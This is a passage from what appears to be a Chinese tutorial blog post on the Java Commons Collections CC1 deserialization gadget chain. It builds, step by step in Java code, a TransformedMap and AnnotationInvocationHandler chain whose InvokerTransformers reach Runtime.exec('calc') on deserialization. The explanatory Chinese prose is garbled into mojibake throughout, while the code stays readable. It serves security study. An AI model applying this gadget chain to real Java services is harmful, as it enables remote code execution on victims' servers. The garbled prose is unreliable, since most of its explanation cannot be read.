&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥å¯ä»¥ç›´æ¥è°ƒç”¨è¯¥æ–¹æ³•ï¼Œå°†invokerTransformerå¯¹è±¡æ³¨å…¥è¿›å»ã€‚æ­¤æ—¶CheckSetValueä¸­çš„valueTransformerå°±å¯ä»¥è¢«æˆ‘ä»¬æ”¹ä¸ºinvokerTransformerå¯¹è±¡ã€‚é‚£ä¹ˆæ¥ä¸‹æ¥å°±éœ€è¦æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥è§¦å‘CheckSetValueçš„æ–¹æ³•ã€‚é€šè¿‡è°ƒè¯•å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªMapEntryç±»ä¸­çš„setValueæ–¹æ³•è°ƒç”¨äº†è¯¥æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MapEntry</span> <span class="keyword">extends</span> <span class="title class_">AbstractMapEntryDecorator</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** The parent map */</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> AbstractInputCheckedMapDecorator parent;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">MapEntry</span><span class="params">(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(entry);</span><br><span class="line">            <span class="built_in">this</span>.parent = parent;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">            value = parent.checkSetValue(value);</span><br><span class="line">            <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>åœ¨MapEntryæ–¹æ³•ä¸­ï¼ŒEntryä»£è¡¨çš„æ˜¯Mapä¸­çš„ä¸€ä¸ªé”®å€¼å¯¹ï¼Œè€Œæˆ‘ä»¬åœ¨Mapä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰setValueæ–¹æ³•ï¼Œè€Œæˆ‘ä»¬åœ¨å¯¹Mapè¿›è¡Œéå†çš„æ—¶å€™å¯ä»¥è°ƒç”¨setValueè¿™ä¸ªæ–¹æ³•ã€‚ç®€å•æ¥è¯´å°±æ˜¯é€šè¿‡é€šè¿‡å¯¹setValue()æ–¹æ³•çš„è°ƒç”¨æ¥è§¦å‘checkSetValue()æ–¹æ³• MapEntryçš„çˆ¶ç±»AbstractMapEntryDecoratoråˆå¼•å…¥äº†Map.Entryæ¥å£ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦è¿›è¡Œå¸¸ç”¨çš„Mapéå†ï¼Œå°±å¯ä»¥è°ƒç”¨setValue()ï¼Œï¼Œç„¶åæ°´åˆ°æ¸ æˆçš„è°ƒcheckSetValue()</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714488730452-190b8a98-e1fa-4f85-8bf0-c42460d081fe.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        map.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>); <span class="comment">//ç»™mapä¸€ä¸ªé”®å€¼å¯¹ï¼Œæ–¹ä¾¿éå†</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ„é€ transformedmapæ˜¯è°ƒç”¨tranform()çš„å‰ç½®æ¡ä»¶</span></span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(</span><br><span class="line">                map, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(Map.Entry entry:transformedMap.entrySet()) &#123;   <span class="comment">//éå†Mapå¸¸ç”¨æ ¼å¼</span></span><br><span class="line">            <span class="comment">//è°ƒç”¨setValueæ–¹æ³•ï¼Œé€šè¿‡setValueå»è§¦å‘checkSetValue()</span></span><br><span class="line">            entry.setValue(runtime);      </span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>æ¢³ç†ä¸€éè¿‡ç¨‹ï¼š </p><p>é¦–å…ˆï¼Œæˆ‘ä»¬æ‰¾åˆ°äº†TransformedMapè¿™ä¸ªç±»ï¼Œæˆ‘ä»¬æƒ³è¦è°ƒç”¨å…¶ä¸­çš„checkSetValueæ–¹æ³•ï¼Œä½†æ˜¯è¿™ä¸ªç±»çš„æ„é€ å™¨æ˜¯peotectedæƒé™ï¼Œåªèƒ½ç±»ä¸­è®¿é—®ï¼Œæ‰€ä»¥æˆ‘ä»¬è°ƒç”¨decorateæ–¹æ³•æ¥å®ä¾‹åŒ–è¿™ä¸ªç±»ï¼Œ</p><p> åœ¨æ­¤ä¹‹å‰æˆ‘ä»¬å…ˆå®ä¾‹åŒ–äº†ä¸€ä¸ªHashMap,å¹¶ä¸”è°ƒç”¨äº†putæ–¹æ³•ç»™ä»–èµ‹äº†ä¸€ä¸ªé”®å€¼å¯¹(è¿™é‡Œæ˜¯ä¸ºäº†è®©æˆ‘ä»¬å†åè¾¹çš„éå†ä¸­è°ƒç”¨setValue()æä¾›å‰ç½®æ¡ä»¶)ï¼Œç„¶åæŠŠè¿™ä¸ªmapå½“æˆå‚æ•°ä¼ å…¥ï¼Œå®ä¾‹åŒ–æˆäº†ä¸€ä¸ªtransformedmapå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡ä¹Ÿæ˜¯Mapç±»å‹çš„ï¼Œ</p><p> ç„¶åæˆ‘ä»¬å¯¹è¿™ä¸ªå¯¹è±¡è¿›è¡Œéå†ï¼Œåœ¨éå†è¿‡ç¨‹ä¸­æˆ‘ä»¬å¯ä»¥è°ƒç”¨setValueæ–¹æ³•ï¼Œè€Œæ°å¥½åˆé‡åˆ°äº†ä¸€ä¸ªé‡å†™äº†setValueçš„çˆ¶ç±»ï¼Œè¿™ä¸ªé‡å†™çš„æ–¹æ³•åˆšå¥½è°ƒç”¨äº†checkSetValueæ–¹æ³•ï¼Œè¿™æ ·å°±å½¢æˆäº†ä¸€ä¸ªé—­ç¯</p><p>ä¸‹é¢å°±æ˜¯æ‰¾åˆ°ä¸€ä¸ªreadObjectä¸­è°ƒç”¨äº†setValueè¿™ä¸ªæ–¹æ³•ï¼šæ‰¾åˆ°äº†AnnotationInvocationHandlerè¿™ä¸ªç±»ä¸­çš„readObjectè°ƒç”¨äº†è¯¥æ–¹æ³•å¦‚ä¸‹ä»£ç æ‰€ç¤ºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">        <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            annotationType = AnnotationType.getInstance(type);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">        <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                      value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    memberValue.setValue(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                            value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥æ‰¾åˆ°è¯¥ç±»çš„æ„é€ æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">        Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">        <span class="keyword">if</span> (!type.isAnnotation() ||</span><br><span class="line">            superInterfaces.length != <span class="number">1</span> ||</span><br><span class="line">            superInterfaces[<span class="number">0</span>] != java.lang.annotation.Annotation.class)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.type = type;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°memberValueæ˜¯å¯æ§çš„æ˜¯å¯ä»¥ç”±æ„é€ æ–¹æ³•ç›´æ¥ä¼ å…¥çš„ã€‚æ‰€ä»¥æ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥ç€æ‰‹æ„é€ ä¸€ä¸‹è¯¥é“¾ï¼Œä½†æ˜¯åœ¨å†™çš„æ—¶å€™ç”±äºè¯¥ç±»æ˜¯javaçš„å†…éƒ¨ç±»æ‰€ä»¥éœ€è¦åå°„æ¥è°ƒç”¨å¦‚ä¸‹ä»£ç æ‰€ç¤ºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å®šä¹‰åºåˆ—åŒ–æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å®šä¹‰ååºåˆ—åŒ–æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectInputStream objectInputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;value&quot;</span>); <span class="comment">//ç»™mapä¸€ä¸ªé”®å€¼å¯¹ï¼Œæ–¹ä¾¿éå†</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ„é€ transformedmapæ˜¯è°ƒç”¨tranform()çš„å‰ç½®æ¡ä»¶</span></span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(</span><br><span class="line">                map, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å–sun.reflect.annotation.AnnotationInvocationHandlerç±»çš„Classå¯¹è±¡</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Target.class, transformedMap);</span><br><span class="line">        <span class="comment">//serialize(o);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ååºåˆ—åŒ–æ—¶è¿è¡ŒæŠ¥é”™è¿™æ˜¯ä¸ºä»€ä¹ˆ:</p><p>é—®é¢˜1ï¼š</p><p><a href="https://xz.aliyun.com/t/7031?time__1311=n4+xnD0GDti=LxQTq05+bDyCbdbd4YvjPx&alichlgref=https://xz.aliyun.com/t/12715?time__1311=mqmhDvOD7GkD8Dl6%252BG78cyuxfhDIgD0I5x&alichlgref=https%253A%252F%252Fwww.google.com%252F#toc-7">https://xz.aliyun.com/t/7031?time__1311&#x3D;n4%2BxnD0GDti%3DLxQTq05%2BbDyCbdbd4YvjPx&amp;alichlgref&#x3D;https%3A%2F%2Fxz.aliyun.com%2Ft%2F12715%3Ftime__1311%3DmqmhDvOD7GkD8Dl6%252BG78cyuxfhDIgD0I5x%26alichlgref%3Dhttps%253A%252F%252Fwww.google.com%252F#toc-7</a></p><p>é€šè¿‡æŸ¥çœ‹Runtimeç±»å‘ç°æ²¡æœ‰å®ç°serializableæ˜¯ä¸å¯åºåˆ—åŒ–çš„æ‰€ä»¥éœ€è¦é€šè¿‡åå°„æ¥è¿›è¡Œæ„é€ </p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714491023957-6fd90bbe-7cf0-428e-b273-33c398566325.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class rc=Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);                 <span class="comment">//è·å–ç±»åŸå‹</span></span><br><span class="line">        Method getRuntime= rc.getDeclaredMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>);    <span class="comment">//è·å–getRuntimeæ–¹æ³•ï¼Œ</span></span><br><span class="line">        Runtime r=(Runtime) getRuntime.invoke(<span class="literal">null</span>,<span class="literal">null</span>);    <span class="comment">//è·å–å®ä¾‹åŒ–å¯¹è±¡ï¼Œå› ä¸ºè¯¥æ–¹æ³•ä¸ºæ— å‚æ–¹æ³•ï¼Œæ‰€ä»¥å…¨ä¸ºnull</span></span><br><span class="line">        Method exec=rc.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>, String.class);        <span class="comment">//è·å–execæ–¹æ³•</span></span><br><span class="line">        exec.invoke(r,<span class="string">&quot;calc&quot;</span>); </span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬éœ€è¦å°†å…¶æ”¹é€ æˆInvokerTransformerçš„å½¢å¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">getRuntime</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">         <span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;).transform(Runtime.class);</span><br><span class="line"></span><br><span class="line"> <span class="comment">//è¿™é‡Œæ¨¡æ‹Ÿè·å–invokeæ–¹æ³•</span></span><br><span class="line"> <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">         <span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;).transform(getRuntime);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="comment">//è¿™é‡Œæ¨¡æ‹Ÿè·å–execæ–¹æ³•ï¼Œå¹¶è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</span></span><br><span class="line"> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, </span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(runtime);</span><br></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œè§£é‡Šä¸‹ä¸ºä»€ä¹ˆéœ€è¦è·å–getMethodæ–¹æ³•è€Œä¸æ˜¯ç›´æ¥è·å–getRuntimeï¼Œå› ä¸ºæˆ‘ä»¬ä¼ å…¥çš„æ˜¯Runtime.classå¯¹è±¡åœ¨InvokerTransformerç±»ä¸­çš„transformæ–¹æ³•ä¼šåœ¨è·å–å…¶classï¼Œæ‰€ä»¥å°±å˜æˆjava.lang.classå¯¹è±¡äº†ï¼Œè¿™ä¸ªç±»æ˜¯ä¸å­˜åœ¨getRuntimeæ–¹æ³•çš„æ‰€ä»¥éœ€è¦å…ˆåå°„è·å–getMethodæ–¹æ³•ï¼Œåœ¨é€šè¿‡invokeä¼ å…¥çš„Runtime.classå¯¹è±¡ï¼Œè·å¾—å…¶getruntimeæ–¹æ³•å› ä¸ºæ­¤æ—¶è·å–çš„methodå¯¹è±¡æ‰€ä»¥è¿˜éœ€è¦åœ¨åå°„è°ƒç”¨invokeæ¥å°†getruntimeçš„å®ä¾‹è·å–å‡ºã€‚æ­¤å¤„å…·ä½“å‚è€ƒ<a href="https://xz.aliyun.com/t/7031?time__1311=n4+xnD0GDti=LxQTq05+bDyCbdbd4YvjPx&alichlgref=https://xz.aliyun.com/t/12715?time__1311=mqmhDvOD7GkD8Dl6%252BG78cyuxfhDIgD0I5x&alichlgref=https%253A%252F%252Fwww.google.com%252F#toc-7">https://xz.aliyun.com/t/7031?time__1311&#x3D;n4%2BxnD0GDti%3DLxQTq05%2BbDyCbdbd4YvjPx&amp;alichlgref&#x3D;https%3A%2F%2Fxz.aliyun.com%2Ft%2F12715%3Ftime__1311%3DmqmhDvOD7GkD8Dl6%252BG78cyuxfhDIgD0I5x%26alichlgref%3Dhttps%253A%252F%252Fwww.google.com%252F#toc-7</a></p><h4 id="å¯¹äºruntimeåå°„è·å–æ”¹æˆInvokerTransformerå½¢å¼çš„è§£é‡Šï¼š"><a href="#å¯¹äºruntimeåå°„è·å–æ”¹æˆInvokerTransformerå½¢å¼çš„è§£é‡Šï¼š" class="headerlink" title="å¯¹äºruntimeåå°„è·å–æ”¹æˆInvokerTransformerå½¢å¼çš„è§£é‡Šï¼š"></a>å¯¹äºruntimeåå°„è·å–æ”¹æˆInvokerTransformerå½¢å¼çš„è§£é‡Šï¼š</h4><p><font style="color:rgb(51, 51, 51);">æ—¢ç„¶æˆ‘ä»¬æ²¡æ³•åœ¨å®¢æˆ·ç«¯åºåˆ—åŒ–å†™å…¥Runtimeçš„å®ä¾‹ï¼Œé‚£å°±è®©æœåŠ¡ç«¯æ‰§è¡Œæˆ‘ä»¬çš„å‘½ä»¤ç”Ÿæˆä¸€ä¸ªRuntimeå®ä¾‹å‘—ï¼Ÿ<br></font>æˆ‘ä»¬çŸ¥é“Runtimeçš„å®ä¾‹æ˜¯é€šè¿‡Runtime.getRuntime()æ¥è·å–çš„ï¼Œè€ŒInvokerTransformer<font style="color:rgb(51, 51, 51);">é‡Œé¢çš„åå°„æœºåˆ¶å¯ä»¥æ‰§è¡Œä»»æ„å‡½æ•°ã€‚<br></font>åŒæ—¶ï¼Œæˆ‘ä»¬å·²ç»æˆåŠŸæ‰§è¡Œè¿‡Runtimeç±»é‡Œé¢çš„execå‡½æ•°ã€‚è®²é“ç†è‚¯å®šæ˜¯æ²¡é—®é¢˜çš„.</p><p>æˆ‘ä»¬å…ˆçœ‹getRuntiimeæ–¹æ³•çš„å‚æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Runtime <span class="title function_">getRuntime</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> currentRuntime;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ²¡æœ‰å‚æ•°ï¼Œé‚£å°±éå¸¸ç®€å•äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//å¾—åˆ°Runtime class</span></span><br><span class="line">    <span class="comment">//ç”±äºInvokerTransformerçš„æ„é€ å‡½æ•°è¦æ±‚ä¼ å…¥Classç±»å‹çš„å‚æ•°ç±»å‹ï¼Œå’ŒObjectç±»å‹çš„å‚æ•°æ•°å€¼ï¼Œæ‰€ä»¥å°è£…ä¸€ä¸‹ï¼Œä¸‹é¢ä¹Ÿä¸€æ ·</span></span><br><span class="line">    <span class="comment">//ä¸Šé¢ä¼ å…¥Runtime.classï¼Œè°ƒç”¨Runtime classçš„getRuntimeæ–¹æ³•ï¼ˆç”±äºæ˜¯ä¸€ä¸ªé™æ€æ–¹æ³•ï¼Œinvokeè°ƒç”¨é™æ€æ–¹æ³•ï¼Œä¼ å…¥ç±»å³å¯ï¼‰</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;),</span><br><span class="line">    <span class="comment">//ä¸Šé¢Runtime.getRuntime()å¾—åˆ°äº†å®ä¾‹ï¼Œä½œä¸ºè¿™è¾¹çš„è¾“å…¥(invokeè°ƒç”¨æ™®é€šæ–¹æ³•ï¼Œéœ€è¦ä¼ å…¥ç±»çš„å®ä¾‹)     </span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">transformerChain.transform(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p><font style="color:rgb(119, 119, 119);">åœ¨è¿™é‡Œï¼Œä¹‹å‰è‡ªå·±é™·å…¥äº†ä¸€ä¸ªå¾ˆå‚»é€¼çš„é—®é¢˜ï¼Œå³ï¼šInvokerTransformerç±»transformæ–¹æ³•ä¸­return method.invoke()è¿™ä¸ªè¯­å¥<br></font><font style="color:rgb(119, 119, 119);">invoke()è°ƒç”¨åˆ°åº•returnäº†å•¥?<br></font><font style="color:rgb(119, 119, 119);">å› ä¸ºåœ¨è¿™é‡Œå½¢æˆäº†ä¸€ä¸ªè°ƒç”¨returnçš„ç»“æœï¼Œå†è°ƒç”¨çš„é“¾ã€‚ä¸ºä»€ä¹ˆå°±å¯ä»¥ä¸Šä¸€ä¸ªè¾“å‡ºä½œä¸ºä¸‹ä¸€ä¸ªè¾“å…¥æ—¶ï¼Œå¯ä»¥æˆåŠŸè°ƒç”¨äº†å‘¢ï¼Ÿ<br></font><font style="color:rgb(119, 119, 119);">ä¸€å¼€å§‹ä»¥ä¸ºinvokeä¼šç»Ÿä¸€è¿”å›ä¸€ä¸ªå¯¹è±¡ä½œä¸ºä¸‹ä¸€ä¸ªè¾“å…¥ä»€ä¹ˆçš„ï¼Œå¹¶ä¸”åœ¨è°ƒè¯•çš„æ—¶å€™æ¯æ¬¡invokeçš„ç»“æœéƒ½ä¸ä¸€æ ·ï¼Œæºç 